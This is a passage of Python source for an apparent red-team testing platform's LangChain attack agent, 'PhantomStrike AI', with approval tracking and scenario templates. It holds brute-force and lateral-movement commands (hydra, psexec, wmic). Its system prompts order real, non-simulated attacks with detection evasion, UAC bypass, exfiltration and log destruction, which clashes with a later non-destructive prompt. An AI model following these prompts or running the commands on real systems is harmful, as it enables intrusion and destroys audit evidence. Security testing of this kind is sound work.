        from pathlib import Path
        project_root = Path(__file__).parent.parent.parent
        sys.path.insert(0, str(project_root))
        
        from core.server.storage.database_manager import DatabaseManager
        db_manager = DatabaseManager()
        
        agent_info = db_manager.get_agent_info(agent_id)
        if agent_info:
            platform = agent_info.get('platform', 'unknown').lower()
            hostname = agent_info.get('hostname', '').lower()
            
            # Determine role based on platform and hostname
            if 'windows' in platform and any(term in hostname for term in ['dc', 'domain', 'controller']):
                return 'domain_controller'
            elif 'linux' in platform and any(term in hostname for term in ['web', 'http', 'apache', 'nginx']):
                return 'web_server'
            elif any(term in hostname for term in ['db', 'database', 'mysql', 'postgres']):
                return 'database_server'
            elif any(term in hostname for term in ['file', 'share', 'nas']):
                return 'file_server'
            else:
                return 'endpoint'
    
    except Exception as e:
        logger.debug(f"Could not determine agent role for {agent_id}: {e}")
    
    return 'endpoint'


def _get_network_config(scenario: Dict) -> Dict:
    """Get network configuration for the scenario"""
    
    return {
        'scenario_network': {
            'name': f"soc-scenario-{scenario.get('scenario_id', 'default')}",
            'subnet': '192.168.100.0/24',
            'gateway': '192.168.100.1'
        },
        'target_network': {
            'name': 'soc-target-network',
            'subnet': '192.168.101.0/24',
            'gateway': '192.168.101.1'
        },
        'attack_network': {
            'name': 'soc-attack-network', 
            'subnet': '192.168.102.0/24',
            'gateway': '192.168.102.1'
        },
        'bridge_config': {
            'enable_bridge': True,
            'bridge_name': 'soc-bridge',
            'allow_cross_network': True
        }
    }


def _get_deployment_instructions(attack_type: str) -> Dict:
    """Get deployment instructions for attack type"""
    
    instructions = {
        'apt_simulation': {
            'steps': [
                '1. Deploy Windows Domain Controller container',
                '2. Configure Active Directory services',
                '3. Deploy APT simulator container',
                '4. Establish network connectivity',
                '5. Begin APT attack simulation'
            ],
            'timeout': '30 minutes',
            'monitoring': ['network_traffic', 'authentication_events', 'file_access']
        },
        'ransomware_simulation': {
            'steps': [
                '1. Deploy file server container with sample data',
                '2. Deploy ransomware simulator container',
                '3. Configure file sharing services',
                '4. Begin ransomware simulation',
                '5. Monitor encryption activities'
            ],
            'timeout': '20 minutes',
            'monitoring': ['file_operations', 'network_connections', 'process_creation']
        },
        'data_exfiltration': {
            'steps': [
                '1. Deploy database server with sample data',
                '2. Deploy data exfiltration simulator',
                '3. Configure database connectivity',
                '4. Begin data collection simulation',
                '5. Monitor data transfer activities'
            ],
            'timeout': '25 minutes',
            'monitoring': ['database_queries', 'network_transfers', 'data_access']
        },
        'web_attack': {
            'steps': [
                '1. Deploy web server with vulnerable application',
                '2. Deploy web attack tools container',
                '3. Configure web services',
                '4. Begin web attack simulation',
                '5. Monitor web traffic and attacks'
            ],
            'timeout': '15 minutes',
            'monitoring': ['web_requests', 'sql_injections', 'xss_attempts']
        }
    }
    
    return instructions.get(attack_type, instructions['apt_simulation'])


def _get_execution_instructions(attack_type: str) -> Dict:
    """Get execution instructions for attack type"""
    
    instructions = {
        'apt_simulation': {
            'execution_phases': [
                {
                    'phase': 'initial_access',
                    'commands': ['nmap -sS target_container', 'hydra -l admin -P passwords.txt target_container'],
                    'duration': '10 minutes'
                },
                {
                    'phase': 'persistence',
                    'commands': ['create_scheduled_task', 'install_backdoor'],
                    'duration': '5 minutes'
                },
                {
                    'phase': 'lateral_movement',
                    'commands': ['psexec target2', 'wmic target2 process call create'],
                    'duration': '15 minutes'
                }
            ],
            'success_criteria': ['successful_login', 'persistence_established', 'lateral_movement_achieved']
        },
        'ransomware_simulation': {
            'execution_phases': [
                {
                    'phase': 'initial_compromise',
                    'commands': ['exploit_vulnerability', 'gain_shell_access'],
                    'duration': '5 minutes'
                },
                {
                    'phase': 'discovery',
                    'commands': ['find_shared_drives', 'enumerate_files'],
                    'duration': '5 minutes'
                },
                {
                    'phase': 'encryption',
                    'commands': ['encrypt_files_simulation', 'drop_ransom_note'],
                    'duration': '10 minutes'
                }
            ],
            'success_criteria': ['files_encrypted', 'ransom_note_dropped', 'network_spread']
        },
        'data_exfiltration': {
            'execution_phases': [
                {
                    'phase': 'database_access',
                    'commands': ['connect_to_database', 'enumerate_tables'],
                    'duration': '5 minutes'
                },
                {
                    'phase': 'data_collection',
                    'commands': ['extract_sensitive_data', 'compress_data'],
                    'duration': '10 minutes'
                },
                {
                    'phase': 'exfiltration',
                    'commands': ['upload_to_external_server', 'clean_traces'],
                    'duration': '10 minutes'
                }
            ],
            'success_criteria': ['data_extracted', 'data_compressed', 'exfiltration_complete']
        }
    }
    
    return instructions.get(attack_type, instructions['apt_simulation'])


def _get_monitoring_config(attack_type: str) -> Dict:
    """Get monitoring configuration for attack type"""
    
    monitoring_configs = {
        'apt_simulation': {
            'monitor_events': [
                'authentication_events',
                'network_connections',
                'process_creation',
                'file_access',
                'registry_modifications'
            ],
            'alert_thresholds': {
                'failed_logins': 5,
                'suspicious_processes': 3,
                'network_anomalies': 2
            },
            'log_sources': ['windows_event_logs', 'network_traffic', 'process_monitor']
        },
        'ransomware_simulation': {
            'monitor_events': [
                'file_encryption_events',
                'network_connections',
                'process_creation',
                'file_modifications',
                'ransom_note_creation'
            ],
            'alert_thresholds': {
                'encrypted_files': 100,
                'ransom_notes': 1,
                'network_spread': 5
            },
            'log_sources': ['file_system_events', 'network_traffic', 'process_monitor']
        },
        'data_exfiltration': {
            'monitor_events': [
                'database_queries',
                'large_data_transfers',
                'external_connections',
                'file_access_patterns',
                'compression_activities'
            ],
            'alert_thresholds': {
                'large_transfers': 1000000,  # 1MB
                'external_connections': 3,
                'suspicious_queries': 10
            },
            'log_sources': ['database_logs', 'network_traffic', 'file_access_logs']
        }
    }
    
    return monitoring_configs.get(attack_type, monitoring_configs['apt_simulation'])


class LangChainAttackAgent:
    """LangChain-based PhantomStrike AI attack agent"""
    
    def __init__(self, llm_config: Dict = None):
        self.llm_config = llm_config or self._default_llm_config()
        
        # Initialize LLM (prefer OpenAI as configured)
        try:
            from langchain_openai import ChatOpenAI
            
            # Use OpenAI GPT-3.5-turbo as primary (as configured in server_config.yaml)
            # Get API key from config or environment - NO HARDCODED FALLBACK
            api_key = self.llm_config.get('api_key') or os.getenv("OPENAI_API_KEY")
            
            if not api_key:
                raise ValueError("OPENAI_API_KEY not found in environment or config. Please set the environment variable.")
            
            self.llm = ChatOpenAI(
                model=self.llm_config.get('model', 'gpt-3.5-turbo'),
                temperature=self.llm_config.get('temperature', 0.7),
                max_tokens=self.llm_config.get('max_tokens', 2048),
                openai_api_key=api_key
            )
            logger.info("Using OpenAI GPT-3.5-turbo for PhantomStrike AI")
            
        except Exception as e:
            logger.warning(f"OpenAI not available, falling back to Ollama: {e}")
            
            # Fallback to Ollama if OpenAI fails
            self.llm = ChatOllama(
                model=self.llm_config.get('model', 'llama2'),
                base_url=self.llm_config.get('endpoint', 'http://localhost:11434'),
                temperature=self.llm_config.get('temperature', 0.7)
            )
        
        # Initialize tools
        self.tools = [
            network_discovery_tool,
            container_deployment_tool,
            native_attack_deployment_tool,
            attack_execution_tool
        ]
        
        # Create LangChain agent with tools
        from langchain.agents import create_openai_tools_agent, AgentExecutor
        from langchain.prompts import ChatPromptTemplate
        
        # Create agent prompt
        agent_prompt = ChatPromptTemplate.from_messages([
            ("system", """You are PhantomStrike AI, an advanced red team attack planning agent.
            
You have access to these tools:
- network_discovery_tool: Discover network topology and endpoints
- container_deployment_tool: Deploy attack containers to client agents (requires Docker)
- native_attack_deployment_tool: Deploy native attack commands to client agents (no Docker required)
- attack_execution_tool: Execute attack scenarios on client agents
- golden_image_management_tool: Manage attack container images

When planning attacks:
1. First use network_discovery_tool to understand the network
2. Then use native_attack_deployment_tool to deploy native system commands (preferred)
3. Or use container_deployment_tool if Docker containers are required
4. Finally use attack_execution_tool to execute the attack

IMPORTANT: Always prefer native_attack_deployment_tool over container_deployment_tool as it works without Docker and generates actual executable system commands (PowerShell, Bash, etc.) that client agents can run directly on their operating systems."""),
            ("user", "{input}"),
            ("assistant", "I'll help you plan and execute sophisticated attack scenarios. Let me start by analyzing the network and then deploying native attack commands that can run directly on client systems without requiring Docker."),
            ("placeholder", "{agent_scratchpad}")
        ])
        
        # Create agent
        self.agent = create_openai_tools_agent(
            llm=self.llm,
            tools=self.tools,
            prompt=agent_prompt
        )
        
        # Create agent executor
        self.agent_executor = AgentExecutor(
            agent=self.agent,
            tools=self.tools,
            verbose=True,
            max_iterations=10
            )
        
        # Initialize memory for conversation context
        self.memory = ConversationBufferMemory(
            memory_key="chat_history",
            return_messages=True
        )
        
        # Initialize callback handler
        self.callback_handler = AttackCallbackHandler()
        
        # Create attack planning tools
        self.tools = [
            network_discovery_tool,
            attack_scenario_generator_tool,
            container_deployment_tool,
            attack_execution_tool
        ]
        
        # Create attack planning prompt
        self.attack_prompt = self._create_attack_prompt()
        
        # Create agent
        self.agent = create_openai_tools_agent(
            llm=self.llm,
            tools=self.tools,
            prompt=self.attack_prompt
        )
        
        # Create agent executor
        self.agent_executor = AgentExecutor(
            agent=self.agent,
            tools=self.tools,
            memory=self.memory,
            callbacks=[self.callback_handler],
            verbose=True,
            max_iterations=10,
            early_stopping_method="generate"
        )
        
        # State tracking
        self.pending_approvals = {}
        self.active_executions = {}
        
        logger.info("LangChain PhantomStrike AI Attack Agent initialized")
    
    def _default_llm_config(self) -> Dict:
        """Load LLM configuration dynamically"""
        try:
            # Try to load from server config
            import sys
            from pathlib import Path
            server_path = Path(__file__).parent.parent.parent / "log_forwarding"
            sys.path.insert(0, str(server_path))
            
            from shared.config import config
            server_config = config.load_server_config()
            llm_config = server_config.get('llm', {})
            
            if llm_config:
                return {
                    'model': llm_config.get('model', 'gpt-3.5-turbo'),
                    'temperature': llm_config.get('temperature', 0.7),
                    'max_tokens': llm_config.get('max_tokens', 2048),
                    'api_key': llm_config.get('api_key', ''),
                    'provider': llm_config.get('provider', 'openai')
                }
        except Exception as e:
            logger.debug(f"Could not load server config: {e}")
        
        # Fallback to auto-detected config
        return self._generate_dynamic_llm_config()
    
    def _generate_dynamic_llm_config(self) -> Dict:
        """Generate dynamic LLM configuration"""
        # Test if Ollama is available
        try:
            response = requests.get('http://localhost:11434/api/tags', timeout=3)
            ollama_available = response.status_code == 200
        except:
            ollama_available = False
        
        # Always prefer OpenAI GPT-3.5-turbo (as configured)
        openai_key = os.getenv('OPENAI_API_KEY')
        if openai_key:
            return {
                'model': 'gpt-3.5-turbo',
                'temperature': 0.7,
                'max_tokens': 2048,
                'api_key': openai_key,
                'provider': 'openai'
            }
        elif ollama_available:
            return {
                'endpoint': 'http://localhost:11434',
                'model': 'llama2',
                'temperature': 0.7,
                'max_tokens': 2048,
                'provider': 'ollama'
            }
        else:
            # Mock fallback
            return {
                'model': 'mock-llm',
                'temperature': 0.7,
                'max_tokens': 2048,
                'provider': 'mock'
            }
    
    def _create_attack_prompt(self) -> ChatPromptTemplate:
        """Create attack planning prompt template"""
        system_message = """You are PhantomStrike AI, an elite red team attack planning specialist.

Your role is to plan and orchestrate REAL attack scenarios for security testing using client-side containers.

You have access to these tools:
- network_discovery_tool: Analyze network topology and identify attack opportunities
- attack_scenario_generator_tool: Generate detailed attack scenarios
- container_deployment_tool: Deploy attack containers to client agents
- attack_execution_tool: Execute approved attack scenarios

REAL APT SCENARIOS AVAILABLE:
1. REAL NETWORK INTRUSION - Live network penetration with actual nmap scans and brute force
2. REAL SYSTEM COMPROMISE - Live system takeover with actual PowerShell execution and process manipulation
3. REAL DATA EXTRACTION - Live data theft with actual file access and exfiltration
4. REAL PERSISTENCE INSTALLATION - Live backdoor installation with actual scheduled tasks and registry changes
5. REAL PRIVILEGE ESCALATION - Live privilege escalation with actual user group modifications and UAC bypass
6. REAL LOG DESTRUCTION - Live evidence destruction with actual log clearing and file deletion

ATTACK PLANNING PROCESS:
1. Analyze the network topology and identify optimal targets
2. Generate detailed attack scenarios based on the objective
3. Deploy appropriate containers to client agents based on their roles
4. Present scenarios to user for approval
5. Execute approved scenarios with full monitoring
6. Clean up containers after completion

IMPORTANT RULES:
- NEVER execute attacks without explicit user approval
- ALWAYS deploy containers to appropriate client agents based on their roles
- Focus on realistic attack paths based on actual network topology
- Map all techniques to MITRE ATT&CK framework
- Consider detection evasion and stealth
- Prioritize high-value targets and lateral movement opportunities
- EXECUTE REAL ATTACKS - No simulation, make it happen for real

CONTAINER DEPLOYMENT:
- Deploy target system containers (Windows DC, Linux servers, databases) to appropriate clients
- Deploy attack agent containers (APT simulators, ransomware sims) to designated clients
- Configure network connectivity between containers
- Use SOC-specific container images for realistic scenarios

REAL ATTACK EXECUTION:
- Execute ACTUAL network scans (nmap, hydra, telnet)
- Execute ACTUAL system compromise (PowerShell, process manipulation, user creation)
- Execute ACTUAL data exfiltration (file copying, compression, network transfer)
- Execute ACTUAL persistence (scheduled tasks, registry changes, service installation)
- Execute ACTUAL privilege escalation (user group modifications, UAC bypass)
- Execute ACTUAL log destruction (event log clearing, file deletion)

SCENARIO QUALITY:
- Base scenarios on real network topology
- Use appropriate techniques for target platforms
- Consider timing and operational security
- Plan for detection and response scenarios
- Include container cleanup procedures
- EXECUTE REAL ATTACKS - No simulation, make it happen for real"""

        prompt = ChatPromptTemplate.from_messages([
            ("system", system_message),
            MessagesPlaceholder(variable_name="chat_history"),
            ("human", "{input}"),
            MessagesPlaceholder(variable_name="agent_scratchpad")
        ])
        
        return prompt
    
    async def plan_attack_scenario(self, attack_request: str, 
                                 network_context: Dict, 
                                 constraints: Dict = None) -> AttackScenario:
        """Plan attack scenario using LangChain agent"""
        try:
            if not constraints:
                constraints = {}
            
            # Prepare input for agent
            planning_input = {
                "input": f"""
Plan a NON-DESTRUCTIVE attack scenario based on this request:

ATTACK REQUEST: {attack_request}

NETWORK CONTEXT: 
{network_context}

CONSTRAINTS:
{constraints}

IMPORTANT SAFETY REQUIREMENTS:
- ALL commands must be NON-DESTRUCTIVE (read-only operations only)
- NO system modifications or damage
- INCLUDE system restoration commands after attack simulation
- Focus on detection testing, not actual system compromise

Please follow the complete planning process:
1. Analyze the network topology
2. Generate NON-DESTRUCTIVE attack scenarios (read-only operations)
3. Plan native system commands (no containers needed)
4. AUTOMATICALLY include system restoration commands
5. Present scenario for approval

Focus on creating SAFE, realistic, network-aware attack scenarios that test detection capabilities without causing damage.
The attack should be followed by automatic system restoration.
""",
                "chat_history": self.memory.chat_memory.messages
            }
            
            # Run agent planning
            result = await self.agent_executor.ainvoke(planning_input)
            
            # Parse result into AttackScenario
            scenario = await self._parse_attack_scenario(result, attack_request)
            
            # Store for approval tracking
            self.pending_approvals[scenario.scenario_id] = {
                'scenario': scenario,
                'created_at': datetime.utcnow(),
                'status': 'pending_approval'
            }
            
            return scenario
            
        except Exception as e:
            logger.error(f"Attack scenario planning failed: {e}")
            return await self._create_real_scenario(attack_request, network_context)
    
    async def execute_approved_scenario(self, scenario_id: str, 
                                      user_approval: bool) -> Dict[str, Any]:
        """Execute attack scenario after user approval"""
        try:
            if scenario_id not in self.pending_approvals:
                return {'success': False, 'error': 'Scenario not found'}
            
            approval_info = self.pending_approvals[scenario_id]
            scenario = approval_info['scenario']
            
            if not user_approval:
                # User rejected scenario
                approval_info['status'] = 'rejected'
                return {
                    'success': False,
                    'status': 'rejected',
                    'message': 'Attack scenario rejected by user'
                }
            
            # User approved - execute scenario
            approval_info['status'] = 'approved'
            approval_info['approved_at'] = datetime.utcnow()
            
            execution_input = {
                "input": f"""
Execute the approved attack scenario:

SCENARIO: {scenario.dict()}

APPROVAL: User has approved this scenario for execution

Please:
1. Create golden images for all target systems
2. Execute the attack phases in sequence
3. Monitor execution and collect results
4. Restore systems from golden images after completion

Proceed with execution now that approval is confirmed.
""",
                "chat_history": self.memory.chat_memory.messages
            }
            
            # Execute via agent
            execution_result = await self.agent_executor.ainvoke(execution_input)
            
            # Track execution
            self.active_executions[scenario_id] = {
                'scenario': scenario,
                'execution_result': execution_result,
                'started_at': datetime.utcnow(),
                'status': 'executing'
            }
            
            return {
                'success': True,
                'scenario_id': scenario_id,
                'execution_started': True,
                'execution_result': execution_result
            }
            
        except Exception as e:
            logger.error(f"Attack execution failed: {e}")
            return {'success': False, 'error': str(e)}
    
    async def _parse_attack_scenario(self, agent_result: Dict, attack_request: str) -> AttackScenario:
        """Parse agent result into AttackScenario object"""
        try:
            output = agent_result.get('output', '')
            
            # Extract scenario information from agent output
            # This is simplified - in production you'd use more sophisticated parsing
            
            scenario_id = f"phantomstrike_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}"
            
            # Determine attack type from request
            request_lower = attack_request.lower()
            if 'apt' in request_lower:
                attack_type = 'apt_simulation'
            elif 'ransomware' in request_lower:
                attack_type = 'ransomware_simulation'
            elif 'data' in request_lower:
                attack_type = 'data_exfiltration'
            else:
                attack_type = 'general_assessment'
            
            # Extract MITRE techniques from output
            import re
            mitre_techniques = re.findall(r'T\d{4}(?:\.\d{3})?', output)
            if not mitre_techniques:
                mitre_techniques = _get_techniques_for_attack_type(attack_type)
            
            return AttackScenario(
                scenario_id=scenario_id,
                name=f"PhantomStrike {attack_type.replace('_', ' ').title()}",
                description=f"AI-generated scenario: {attack_request}",
                attack_type=attack_type,
                target_agents=[],  # Would be populated from network analysis
                mitre_techniques=mitre_techniques,
                attack_phases=_generate_attack_phases(attack_type, {}),
                estimated_duration=_estimate_duration(attack_type),
                risk_level=_assess_risk_level(attack_type, {}),
                requires_approval=True
            )
            
        except Exception as e:
            logger.error(f"Scenario parsing failed: {e}")
            return await self._create_real_scenario(attack_request, {})
    
    async def _create_real_scenario(self, attack_request: str, network_context: Dict) -> AttackScenario:
        """Create real attack scenario using GPT-3.5 turbo"""
        try:
            # Use real GPT-3.5 turbo to generate attack scenario
            prompt = f"""
You are a red team expert creating a realistic attack scenario.

ATTACK REQUEST: {attack_request}
NETWORK CONTEXT: {network_context}

Create a detailed attack scenario with these requirements:
1. Use real MITRE ATT&CK techniques
2. Consider the actual network topology
3. Plan realistic attack phases
4. Estimate accurate durations
5. Assess genuine success probability
6. IMPORTANT: After creating the scenario, you MUST use the container_deployment_tool and attack_execution_tool to generate actual executable commands for client agents

Respond with JSON:
{{
    "scenario_id": "gpt_generated_scenario_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}",
    "name": "GPT Generated Attack Scenario",
    "description": "Detailed scenario created by GPT-3.5 turbo",
    "attack_type": "advanced_persistent_threat",
    "target_agents": [],
    "mitre_techniques": ["T1566.001", "T1190", "T1059.001", "T1003.001"],
    "attack_phases": [],
    "estimated_duration": "2 hours",
    "risk_level": "high",
    "requires_approval": true
}}

After creating the scenario, you MUST:
1. Use container_deployment_tool to deploy attack containers
2. Use attack_execution_tool to generate executable commands
3. Generate actual commands that client agents can execute
"""
            
            # Make real GPT-3.5 turbo API call
            response = await self.llm.ainvoke(prompt)
            
            # Parse the response
            import json
            try:
                scenario_data = json.loads(response.content)
            except json.JSONDecodeError:
                # If not valid JSON, create from text response
                scenario_data = {
                    "scenario_id": f"gpt_text_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}",
                    "name": "GPT Generated Scenario",
                    "description": response.content[:200],
                    "attack_type": "custom",
                    "target_agents": [],
                    "mitre_techniques": ["T1082", "T1018"],
                    "attack_phases": [],
                    "estimated_duration": "1 hour",
                    "risk_level": "medium",
                    "requires_approval": True
                }
            
            return AttackScenario(
                scenario_id=scenario_data.get('scenario_id'),
                name=scenario_data.get('name'),
                description=scenario_data.get('description'),
                attack_type=scenario_data.get('attack_type', 'custom'),
                target_agents=scenario_data.get('target_agents', []),
                mitre_techniques=scenario_data.get('mitre_techniques', []),
                attack_phases=scenario_data.get('attack_phases', []),
                estimated_duration=scenario_data.get('estimated_duration', '1 hour'),
                risk_level=scenario_data.get('risk_level', 'medium'),
                requires_approval=scenario_data.get('requires_approval', True)
            )
            
        except Exception as e:
            logger.error(f"GPT scenario generation failed: {e}")
            # Emergency fallback only if GPT completely fails
            return AttackScenario(
                scenario_id=f"emergency_{datetime.utcnow().strftime('%Y%m%d_%H%M%S')}",
                name="Emergency Scenario - GPT Failed",
                description=f"Emergency scenario for: {attack_request} (GPT generation failed: {str(e)})",
                attack_type="emergency",
                target_agents=[],
                mitre_techniques=['T1082'],
                attack_phases=[],
                estimated_duration="30 minutes",
                risk_level="low",
                requires_approval=True
            )
    
    async def get_pending_approvals(self) -> List[Dict]:
        """Get scenarios pending user approval"""
        try:
            pending = []
            
            for scenario_id, approval_info in self.pending_approvals.items():
                if approval_info['status'] == 'pending_approval':
                    scenario = approval_info['scenario']
                    pending.append({
                        'scenario_id': scenario_id,
                        'scenario_name': scenario.name,
                        'attack_type': scenario.attack_type,
                        'target_count': len(scenario.target_agents),
                        'risk_level': scenario.risk_level,
                        'estimated_duration': scenario.estimated_duration,
                        'created_at': approval_info['created_at'].isoformat(),
                        'techniques': scenario.mitre_techniques
                    })
            
            return pending
            
        except Exception as e:
            logger.error(f"Get pending approvals failed: {e}")
            return []
    
    async def get_execution_status(self) -> Dict[str, Any]:
        """Get status of active executions"""
        try:
            active_executions = []
            
            for scenario_id, execution_info in self.active_executions.items():
                scenario = execution_info['scenario']
                active_executions.append({
                    'scenario_id': scenario_id,
                    'scenario_name': scenario.name,
                    'attack_type': scenario.attack_type,
                    'status': execution_info['status'],
                    'started_at': execution_info['started_at'].isoformat(),
                    'progress': self._calculate_execution_progress(execution_info)
                })
            
            return {
                'active_executions': active_executions,
                'pending_approvals': len([a for a in self.pending_approvals.values() 
                                        if a['status'] == 'pending_approval']),
                'agent_status': 'operational',
                'last_update': datetime.utcnow().isoformat()
            }
            
        except Exception as e:
            logger.error(f"Execution status check failed: {e}")
            return {'error': str(e)}
    
    def _calculate_execution_progress(self, execution_info: Dict) -> str:
        """Calculate execution progress"""
        # Simplified progress calculation
        start_time = execution_info['started_at']
        elapsed = (datetime.utcnow() - start_time).total_seconds()
        
        if elapsed < 300:  # 5 minutes
            return 'initializing'
        elif elapsed < 1800:  # 30 minutes
            return 'in_progress'
        else:
            return 'completing'


# Global LangChain attack agent instance
phantomstrike_ai = LangChainAttackAgent()
